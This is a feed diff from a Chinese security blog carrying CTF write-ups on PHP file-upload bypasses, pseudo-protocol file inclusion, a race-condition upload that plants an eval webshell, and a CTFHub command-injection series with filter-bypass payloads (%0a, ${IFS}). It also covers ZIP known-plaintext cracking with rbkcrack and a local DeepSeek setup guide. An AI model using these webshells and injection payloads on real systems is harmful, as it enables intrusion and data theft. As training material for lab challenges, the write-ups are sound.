+    <id>https://blog.m3x1.cn/posts/a546d02c.html</id>
+    <published>2025-03-14T16:00:00.000Z</published>
+    <updated>2025-03-18T14:15:08.956Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>题目来源：NSSCTF平台</p></blockquote><p>[TOC]</p><h4 id="SWPUCTF-2021-新生赛-easyupload2-0">[SWPUCTF 2021 新生赛]easyupload2.0</h4><blockquote><p>考点：文件上传绕过</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315181309418.png" alt="image-20250315181309418"></p><p>进行文件上传测试，首先上传jpg文件，然后抓包改成php文件，结果提示php文件不能上传。</p><p>上传htaccess文件也不行，于是改成后缀为phtml。</p><p>phtml也会被当成php解析。</p><p>发现上传成功，用蚁剑连接，找到flag.</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315181643259.png" alt="image-20250315181643259"></p><blockquote><p>NSSCTF{76333d4d-efe1-4a18-acf5-09bd35c8ca3b}</p></blockquote><h4 id="SWPUCTF-2021-新生赛-PseudoProtocols">[SWPUCTF 2021 新生赛]PseudoProtocols</h4><blockquote><p>考点：PHP伪协议，文件包含</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315191122515.png" alt="image-20250315191122515"></p><p>先扫一下目录，发现什么都没有，然后看到需要传参，又要读取hint.php，使用filter伪协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=/var/www/html/hint.php</span><br></pre></td></tr></table></figure><p>得到一串base64，解码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PD9waHANCi8vZ28gdG8gL3Rlc3QyMjIyMjIyMjIyMjIyLnBocA0KPz4=</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">//go to /test2222222222222.php</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>直接访问/test2222222222222.php</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315191348678.png" alt="image-20250315191348678"></p><p>直接使用data协议绕过file_get_contents函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?a=data://text/plain;base64,SSB3YW50IGZsYWc=</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315191105190.png" alt="image-20250315191105190"></p><blockquote><p>NSSCTF{74d9bfc7-cdff-4a86-a6c0-f76568061d63}</p></blockquote><h4 id="FSCTF-2023-加速加速">[FSCTF 2023]加速加速</h4><blockquote><p>考点：条件竞争</p></blockquote><p>先把后缀改成.jpg拿到对方保存文件的路径，为当前路径下的upload目录里。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/34c2cf74b08950b8f9f87a2ebccb2bbd.png" alt="1698321877579">看见标签是条件竞争，那就按照条件竞争的方法去做。</p><p>先创建一个jz-cmd.php文件，运行创建cmd.php文件并写入一句话木马的命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $f=fopen(&quot;cmd.php&quot;,&quot;w&quot;); fputs($f,&#x27;&lt;?php @eval($_POST[cmd]);?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>先抓取上传文件的数据包，再抓取访问upload文件夹里的jz-cmd.php这两个数据包；虽然上传jz-cmd.php是不被允许的，但其实这个文件在服务器上有存在过，只是很快就被删除了。所以我们用BP疯狂发包访问upload文件夹下的jz-cmd.php文件是道理的。而只要此jz-cmd.php被访问成功，就会在upload文件夹里创建cmd.php这个后门文件。</p><p>具体操作就是抓取上传和访问的数据包，然后将他们都放入intruder中，设置如下：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8367695e46096811033b203f54941d0f.png" alt="1698322910515"></p><p>然后就先攻击发送的数据包，再攻击读取（读取cmd.php）的数据包。读取的包出现200，且浏览器能正常访问，说明一句话木马就写入进去了，用蚁剑连接找到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-15%20202450.png" alt=""></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315202512251.png" alt="image-20250315202512251"></p><blockquote><p>FSCTF{p@ti0ns_15_key_1n_1ife}</p></blockquote>]]></content>
+    
+    
+    <summary type="html">2025.3.15刷题题目:[SWPUCTF 2021 新生赛]easyupload2.0,[SWPUCTF 2021新生赛]PseudoProtocols,[FSCTF 2023]加速加速</summary>
+    
+    
+    
+    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
+    
+    
+    <category term="web-wp" scheme="https://blog.m3x1.cn/tags/web-wp/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>本地搭建deepseek</title>
+    <link href="https://blog.m3x1.cn/posts/ca8cf98d.html"/>
+    <id>https://blog.m3x1.cn/posts/ca8cf98d.html</id>
+    <published>2025-02-18T16:00:00.000Z</published>
+    <updated>2025-05-18T12:48:39.577Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="准备阶段">准备阶段</h2><p>先下载Ollama和chatbox安装包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ollama: https://ollama.com/</span><br><span class="line">chatbox: https://chatboxai.app/zh</span><br></pre></td></tr></table></figure><p>在电脑上安装后即可</p><h2 id="搭建步骤">搭建步骤</h2><p>安装之后，按win+r，输入cmd进入命令框</p><p>然后我们在回到ollama的官网：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219215910238.png" alt="image-20250219215910238"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220104107.png" alt="image-20250219220104107"></p><p>复制后面的代码到命令框下载，等待它下载完</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220218270.png" alt="image-20250219220218270"></p><p>然后打开chatbox，选择使用本地模型</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220351053.png" alt="image-20250219220351053"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220409690.png" alt="image-20250219220409690"></p><p>模型位置点击三角形位置选择安装好的deepseek模型，上下文消息数量20那个位置记得选择不限制。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220432827.png" alt="image-20250219220432827"></p><p>根据自己喜好设置其他选项，点击保存，然后就可以试试对话了。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220640616.png" alt="image-20250219220640616"></p><p>至此初始化就完成了，基本的功能就完成了。</p><h2 id="启动注意事项">启动注意事项</h2><p>每次在chatbox启动的时候，都要先在命令框输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ollama list    #查看mode</span><br><span class="line">ollama run modename    #运行mode</span><br></pre></td></tr></table></figure><p>然后才能在chatbox本地使用。</p><p>否则会报错没有网络。</p>]]></content>
+    
+    
+    <summary type="html">🥧本地搭建deepseek</summary>
+    
+    
+    
+    <category term="其他学习笔记" scheme="https://blog.m3x1.cn/categories/%E5%85%B6%E4%BB%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    
+    <category term="其他学习笔记" scheme="https://blog.m3x1.cn/tags/%E5%85%B6%E4%BB%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>CTFHub技能树-rce</title>
+    <link href="https://blog.m3x1.cn/posts/72fb0684.html"/>
+    <id>https://blog.m3x1.cn/posts/72fb0684.html</id>
+    <published>2025-01-31T16:00:00.000Z</published>
+    <updated>2025-02-01T13:26:47.646Z</updated>
+    
+    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="eval执行">eval执行</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">if (isset($_REQUEST[&#x27;cmd&#x27;])) &#123;</span><br><span class="line">    eval($_REQUEST[&quot;cmd&quot;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>没有任何绕过，直接执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=system(&#x27;ls /&#x27;);</span><br><span class="line">?cmd=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure><blockquote><p>ctfhub{953435d20ae6652047e620c4}</p></blockquote><h2 id="文件包含">文件包含</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128231455539.png" alt="image-20241128231455539"></p><p>审计代码，发现过滤了flag关键字，include包含文件的内容，根据提示，发现有个shell.txt文件，而且文件内容是接受传参请求，可以利用这个漏洞。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128234155787.png" alt="image-20241128234155787"></p><p>所以思路就是文件包含shell.txt文件，然后传参触发eval函数来rce。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=shell.txt&amp;ctfhub=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure><blockquote><p>ctfhub{e95bf56ca09c475de96779f8}</p></blockquote><h2 id="php-input">php://input</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128234417464.png" alt="image-20241128234417464"></p><p>有个phpinfo()的网页，打开，搜索flag，没有。</p><p>根据提示使用php://input协议</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128234916846.png" alt="image-20241128234916846"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128234946005.png" alt="image-20241128234946005"></p><blockquote><p>ctfhub{fd2d24ec67a3d02745d252ec}</p></blockquote><h2 id="读取源代码">读取源代码</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128235118224.png" alt="image-20241128235118224"></p><p>根据代码和提示，要使用php协议读取目录/flag</p><p>直接使用filter协议读取，构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/convert.base64-encode/resource=/flag</span><br></pre></td></tr></table></figure><blockquote><p>ctfhub{ad11f5cf0c3528e0097fc84f}</p></blockquote><h2 id="远程包含">远程包含</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128235615623.png" alt="image-20241128235615623"></p><p>跟上面的题目一样,直接使用php://input，然后写入一句话木马</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129000043701.png" alt="image-20241129000043701"></p><p>蚁剑连接，拿到flag</p><blockquote><p>ctfhub{bc23c4d608ef1b89ff1d8564}</p></blockquote><h2 id="命令注入">命令注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $cmd = &quot;ping -c 4 &#123;$_GET[&#x27;ip&#x27;]&#125;&quot;;</span><br><span class="line">    exec($cmd, $res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出来是一个ping网址的功能，先试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls -al</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250201210701699.png" alt="image-20250201210701699"></p><p>打开278612477123991.php</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250201211032131.png" alt="image-20250201211032131"></p><blockquote><p>ctfhub{7c642fd3989abe8db46cf948}</p></blockquote><h2 id="过滤cat">过滤cat</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">    $m = [];</span><br><span class="line">    if (!preg_match_all(&quot;/cat/&quot;, $ip, $m)) &#123;</span><br><span class="line">        $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>过滤了cat，但是可以用tac</p><blockquote><p>ctfhub{7c7a18aea2905940e36dd90e}</p></blockquote><h2 id="过滤空格">过滤空格</h2><p>过滤了空格可以用${IFS}代替</p><blockquote><p>ctfhub{635b63dfee2f877be2058c7c}</p></blockquote><h2 id="过滤目录分隔符">过滤目录分隔符</h2><p>过滤了目录分隔符，但是可以使用命令拼接来找flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cd flag_is_here;ls -al</span><br><span class="line">127.0.0.1;cd flag_is_here;cat flag_31274326351910.php</span><br></pre></td></tr></table></figure><blockquote><p>ctfhub{0a399fadb5bd0716775832b5}</p></blockquote><h2 id="过滤运算符">过滤运算符</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">    $m = [];</span><br><span class="line">    if (!preg_match_all(&quot;/(\||\&amp;)/&quot;, $ip, $m)) &#123;</span><br><span class="line">        $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>过滤了|和&amp;符号，但是可以用分号;</p><blockquote><p>ctfhub{83f8b09d42bb7631282a83b4}</p></blockquote><h2 id="综合过滤练习">综合过滤练习</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">    $m = [];</span><br><span class="line">    if (!preg_match_all(&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;, $ip, $m)) &#123;</span><br><span class="line">        $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析一下，过滤了|&amp;; ，可以使用%0a来作为回车符使用，效果一样</p><p>过滤三个关键字cat,flag,ctfhub，可以使用两个单引号或者两个双引号绕过</p><p>过滤空格，可以使用${IFS}绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1%0als$&#123;IFS&#125;-al%0acd$&#123;IFS&#125;fla&#x27;&#x27;g_is_here%0aca&#x27;&#x27;t$&#123;IFS&#125;f*</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130130405955.png" alt="image-20241130130405955"></p><blockquote><p>ctfhub{cbff46daeb4e000265fb35d6}</p></blockquote>]]></content>
+    
+    
+    <summary type="html">CTFHub技能树-rce系列wp</summary>
+    
+    
+    
+    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
+    
+    
+    <category term="web-wp" scheme="https://blog.m3x1.cn/tags/web-wp/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>两种明文攻击</title>
+    <link href="https://blog.m3x1.cn/posts/fcd8d963.html"/>
+    <id>https://blog.m3x1.cn/posts/fcd8d963.html</id>
+    <published>2025-01-19T16:00:00.000Z</published>
+    <updated>2025-01-21T06:22:40.574Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="一、完整的明文文件">一、完整的明文文件</h4><p>要达成明文攻击需要注意以下三点</p><p>①完整的明文文件</p><p>②明文文件需要被相同的压缩算法标准压缩（也可理解为被相同压缩工具压缩）</p><p>③明文对应文件的加密算法需要是 ZipCrypto（ZipCrypto又分为ZipCrypto Deflate/ZipCrypto Store）</p><p>使用ARCHPR进行明文攻击</p><p>破解时长应该不超过5分钟，运行至5分钟左右可以手动停止，ARCHPR会跳出来破解出的三个key。当然，这个结果并不是压缩包的密码，而是一个去除密码的压缩包<code>xxx_decrypted.zip</code>，把这个文件直接解开就可以了。</p><p>用以上方法需要已知一整个明文文件。</p><h4 id="二、已知一部分明文">二、已知一部分明文</h4><p>使用rbkcrack只需要知道加密压缩包内容的连续12个字节，即可进行攻击破解。同时，结合各类已知的文件格式，更扩宽了ZIP已知明文攻击的攻击面。</p><blockquote><p>rbkcrack下载地址：</p><p><a href="https://github.com/Aloxaf/rbkcrack">https://github.com/Aloxaf/rbkcrack</a></p></blockquote><p>rbkcrack常用参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-C 加密的压缩包</span><br><span class="line">-c 压缩包内加密的文件</span><br><span class="line">-p 明文内容</span><br><span class="line">-k 输入key</span><br><span class="line">-o 偏移量</span><br><span class="line">-d 攻击完成后导出解密文件</span><br><span class="line">-u 自动解压</span><br></pre></td></tr></table></figure><p>实例：</p><p>png是制作的png文件头</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rbkcrack<span class="selector-class">.exe</span> -C LP<span class="selector-class">.zip</span> -c LP<span class="selector-class">.png</span> -<span class="selector-tag">p</span> png</span><br></pre></td></tr></table></figure><p>拿到key后进行解密</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rbkcrack.exe -C LP.zip -c LP.png -k <span class="number">0f</span>518bd2 <span class="number">680365f</span>9 <span class="number">0</span>ecf26a8 -d <span class="keyword">out</span>.png</span><br></pre></td></tr></table></figure><p>因为LP.zip是以ZipCrypto Deflate方式加密的</p><p>所以解密后注意得到的out.png是deflate的数据流，需要使用python脚本进行解码</p><p>在rbkcrack的tools里找到这个脚本</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python inflate.py &lt; <span class="keyword">out</span>.png &gt; out1.png</span><br></pre></td></tr></table></figure><p>至此大功告成，成功提取到压缩文件里的LP.png</p>]]></content>
+    
+    
+    <summary type="html">🥧两种明文攻击</summary>
+    
+    
+    
+    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
+    
+    
+    <category term="misc姿势" scheme="https://blog.m3x1.cn/tags/misc%E5%A7%BF%E5%8A%BF/"/>
     
   </entry>
   
